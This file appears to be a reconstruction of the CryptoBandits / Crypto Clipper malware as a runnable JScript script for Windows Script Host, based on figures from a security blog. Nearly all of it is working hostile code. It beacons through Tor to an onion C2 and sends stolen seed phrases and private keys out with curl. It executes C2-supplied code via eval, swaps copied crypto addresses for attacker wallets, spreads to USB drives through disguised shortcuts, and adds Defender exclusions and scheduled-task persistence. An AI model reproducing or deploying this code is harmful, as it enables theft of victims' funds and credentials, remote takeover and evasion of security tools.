// Reconstructed from Microsoft Security blog figures (CryptoBandits / Crypto Clipper)
// JScript payload run under Windows Script Host (wscript.exe / cscript.exe).

// -- C2 over Tor ---------------------------------------------------------------
var ONION_HOST = 'cgky6bn6ux5wvlybtmm3z255igt52ljml2ngnc5qp3cnw5jlglamisad.onion';
var PING_URL  = 'http://' + ONION_HOST + '/route.php';
var FILE_URL  = 'http://' + ONION_HOST + '/recvf.php';
var STUB_URL  = 'http://' + ONION_HOST + '/stub.php';
var TOR_PROXY = 'localhost:9050';

var GUID = '';
var GEIP = '';
var lastClipboard = '';

// Known attacker-controlled replacement wallet pools.
var btcLegacyAddresses = ['1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'];
var btcP2SHAddresses   = ['3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy'];
var btcBech32Addresses = ['bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'];
var tronAddresses      = ['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'];
var moneroAddress      = '44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEJ3';

function runCurl(args) {
    var shell = WScript.CreateObject('WScript.Shell');
    return shell.Run('"curl.exe" ' + args, 0, true);
}

// Beacon / exfil to the onion C2 through the local Tor SOCKS5 proxy.
function pingToOnionC2(action, payload) {
    var data = 'GUID=' + GUID + '&GEIP=' + GEIP + '&action=' + action;
    if (payload) data += '&data=' + payload;
    var tempDir = WScript.CreateObject('WScript.Shell').ExpandEnvironmentStrings('%TEMP%');
    var cmd = '-X POST -d "' + data + '"'
            + ' --socks5-hostname ' + TOR_PROXY
            + ' ' + PING_URL
            + ' --max-time 30'
            + ' -o ' + tempDir + '\\cfile';
    return runCurl(cmd);
}

// Download a stub/payload from the C2 to disk.
function downloadFromC2(url, outPath) {
    var cmd = '-X GET --socks5-hostname ' + TOR_PROXY + ' ' + url
            + ' --max-time 60 -o "' + outPath + '"';
    return runCurl(cmd);
}

// -- C2 command dispatch (Figure 7) --------------------------------------------
function checkC2Command() {
    var shell = WScript.CreateObject('WScript.Shell');
    var tempDir = shell.ExpandEnvironmentStrings('%TEMP%');
    var fso = new ActiveXObject('Scripting.FileSystemObject');

    var responsePath = tempDir + '\\cfile';
    if (!fso.FileExists(responsePath)) return false;

    var f = fso.OpenTextFile(responsePath, 1);
    if (f.AtEndOfStream) return false;

    var firstLine = f.ReadLine();
    var body = '';
    while (!f.AtEndOfStream) body += f.ReadLine() + '\r\n';
    f.Close();
    try { fso.DeleteFile(responsePath); } catch (e1) { }

    try {
        firstLine = firstLine.replace(/\r?\n$/, '');
        if (firstLine == 'GUID') return true;        // ack only
        if (firstLine == 'EVAL') {                    // remote code execution
            if (body) eval(body);
            return true;
        }
    } catch (e2) { }
    return false;
}

// -- Clipboard primitives ------------------------------------------------------
function getClipboardText() {
    try {
        var html = WScript.CreateObject('htmlfile');
        return html.parentWindow.clipboardData.getData('Text') || '';
    } catch (e) { return ''; }
}

function setClipboardText(text) {
    var shell = WScript.CreateObject('WScript.Shell');
    shell.Run('cmd.exe /c echo ' + text + '| clip.exe', 0, true);
    return text;
}

// -- Seed phrase / private key theft -------------------------------------------
function looksLikeSeedPhrase(clip) {
    var words = clip.split(/\s+/);
    return (words.length == 12 || words.length == 24);
}

function looksLikePrivateKey(clip) {
    // Ethereum hex private key or Bitcoin WIF.
    return /^(0x)?[0-9a-fA-F]{64}$/.test(clip) || /^[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(clip);
}

// -- Clipboard hijack loop (Figure 8 shows the BTC P2SH branch) ----------------
function handleClipboard() {
    var clip = getClipboardText();
    if (!clip || clip == lastClipboard) return;

    if (looksLikeSeedPhrase(clip)) {
        pingToOnionC2('SEED', clip);
        return;
    }
    if (looksLikePrivateKey(clip)) {
        pingToOnionC2('PKEY', clip);
        return;
    }

    var firstChar = clip.charAt(0);
    var clipLen = clip.length;

    // BTC P2SH (3...)
    if (firstChar == '3' && clipLen > 32 && clipLen <= 36) {
        var discriminator = clip.substring(1, 2);
        var found = false;
        for (var i = 0; i < btcP2SHAddresses.length; i++) {
            var addrDisc = btcP2SHAddresses[i].substring(1, 2);
            if (discriminator == addrDisc) {
                lastClipboard = setClipboardText(btcP2SHAddresses[i]);
                pingToOnionC2('REPL', clip + '->' + btcP2SHAddresses[i]);
                found = true;
                break;
            }
        }
        if (!found) {
            lastClipboard = setClipboardText(btcP2SHAddresses[0]);
            pingToOnionC2('REPL', clip + '->' + btcP2SHAddresses[0]);
        }
    }
    // BTC legacy (1...)
    else if (firstChar == '1' && clipLen > 25 && clipLen <= 34) {
        lastClipboard = setClipboardText(btcLegacyAddresses[0]);
        pingToOnionC2('REPL', clip + '->' + btcLegacyAddresses[0]);
    }
    // Tron (T..., 34 chars)
    else if (firstChar == 'T' && clipLen == 34) {
        lastClipboard = setClipboardText(tronAddresses[0]);
        pingToOnionC2('REPL', clip + '->' + tronAddresses[0]);
    }
    // Monero (4.../8..., 95 chars)
    else if ((firstChar == '4' || firstChar == '8') && clipLen == 95) {
        lastClipboard = setClipboardText(moneroAddress);
        pingToOnionC2('REPL', clip + '->' + moneroAddress);
    }
    // BTC bech32 / taproot (bc1...)
    else if (clip.substring(0, 3) == 'bc1' && clipLen >= 40 && clipLen <= 64) {
        lastClipboard = setClipboardText(btcBech32Addresses[0]);
        pingToOnionC2('REPL', clip + '->' + btcBech32Addresses[0]);
    }
}

// -- Worm: infect removable drives (Figures 2 & 3) -----------------------------
function infectFilesOnDrive(drive, payloadPath) {
    var fso = new ActiveXObject('Scripting.FileSystemObject');
    var shell = WScript.CreateObject('WScript.Shell');
    var drivePath = drive.Path + '\\';
    var folder = fso.GetFolder(drive.Path);
    var files = new Enumerator(folder.Files);

    var targetExtensions = ['.doc', '.docx', '.xls', '.xlsx', '.txt', '.pdf'];
    for (; !files.atEnd(); files.moveNext()) {
        var file = files.item();
        var fileName = file.Name;
        var ext = '.' + fso.GetExtensionName(fileName).toLowerCase();
        var match = false;
        for (var k = 0; k < targetExtensions.length; k++) {
            if (ext == targetExtensions[k]) { match = true; break; }
        }
        if (!match) continue;

        // Hide the original file
        try {
            file.Attributes = file.Attributes | 2;   // Hidden attribute
        } catch (e) { }

        // Create a shortcut (.lnk) with the same name as the original file
        var lnkPath = drivePath + fso.GetBaseName(fileName) + '.lnk';
        try {
            var shortcut = shell.CreateShortcut(lnkPath);
            // Execute payload, then open the original file
            shortcut.TargetPath = 'cmd.exe';
            shortcut.Arguments = '/c start "" "' + payloadPath + '" && start "" "' + file.Path + '"';
            shortcut.WorkingDirectory = drivePath;
            shortcut.WindowStyle = 7;  // Minimized, hidden
            shortcut.Description = 'Document';
            try {
                shortcut.IconLocation = file.Path + ',0';
            } catch (e) {
                shortcut.IconLocation = '%SystemRoot%\\System32\\shell32.dll,0';
            }
            shortcut.Save();
        } catch (e) { }
    }
}

function infectDrive(drive) {
    var fso = new ActiveXObject('Scripting.FileSystemObject');
    var shell = WScript.CreateObject('WScript.Shell');
    var username = shell.ExpandEnvironmentStrings('%USERNAME%');
    var scriptDir = fso.GetParentFolderName(WScript.ScriptFullName) + '\\';

    // Payload filename pattern: <username>_x4.exe
    var payloadName = username + '_x4.exe';
    var payloadPath = scriptDir + payloadName;

    // Download payload from C2 if not already present
    if (!fso.FileExists(payloadPath)) {
        downloadFromC2(STUB_URL, payloadPath);
    }
    if (!fso.FileExists(payloadPath)) return;

    var drivePath = drive.Path + '\\';
    var drivePayloadPath = drivePath + payloadName;
    try {
        fso.CopyFile(payloadPath, drivePayloadPath, true);
    } catch (e) {
        return;  // Can't write to drive
    }
    infectFilesOnDrive(drive, drivePayloadPath);
}

// -- Defender exclusions before staging the JS payloads (Figure 4) -------------
function addDefenderExclusions(stageDir) {
    var shell = WScript.CreateObject('WScript.Shell');
    shell.Run('powershell -Command "Add-MpPreference -ExclusionPath \'E:\\\'"', 0, true);
    shell.Run('powershell -Command "Add-MpPreference -ExclusionPath \'' + stageDir + '\'"', 0, true);
    shell.Run('powershell -Command "Add-MpPreference -ExclusionPath \'%TEMP%\'"', 0, true);
    shell.Run('powershell -Command "Add-MpPreference -ExclusionProcess \'C:\\Windows\\System32\\cmd.exe\'"', 0, true);
    shell.Run('powershell -Command "Add-MpPreference -ExclusionProcess \'C:\\Windows\\System32\\clip.exe\'"', 0, true);
}

// -- Persistence: two indefinite scheduled tasks via XML (Figure 1) -----------
function installScheduledTask(taskName, xmlPath) {
    var shell = WScript.CreateObject('WScript.Shell');
    shell.Run('schtasks /create /tn ' + taskName + ' /xml "' + xmlPath + '" /f', 0, true);
}

// -- Tor bootstrap -------------------------------------------------------------
function startTor(stageDir) {
    var shell = WScript.CreateObject('WScript.Shell');
    // Portable Tor renamed to ugate.exe, hidden window.
    shell.Run('"' + stageDir + '\\ugate.exe"', 0, false);
    WScript.Sleep(60000);  // wait for bootstrap
}

// -- Main loop -----------------------------------------------------------------
function main() {
    var fso = new ActiveXObject('Scripting.FileSystemObject');
    var shell = WScript.CreateObject('WScript.Shell');
    var stageDir = 'C:\\Users\\Public\\Documents\\ujiqa';

    addDefenderExclusions(stageDir);
    startTor(stageDir);
    installScheduledTask('exefu', stageDir + '\\exefu.xml');
    installScheduledTask('ofolu', stageDir + '\\ofolu.xml');

    // Propagate to all removable drives.
    var drives = new Enumerator(fso.Drives);
    for (; !drives.atEnd(); drives.moveNext()) {
        var d = drives.item();
        if (d.DriveType == 1 && d.IsReady) {   // 1 == removable
            infectDrive(d);
        }
    }

    // Clipboard hijack + C2 polling forever.
    while (true) {
        handleClipboard();
        checkC2Command();
        WScript.Sleep(500);
    }
}

main();

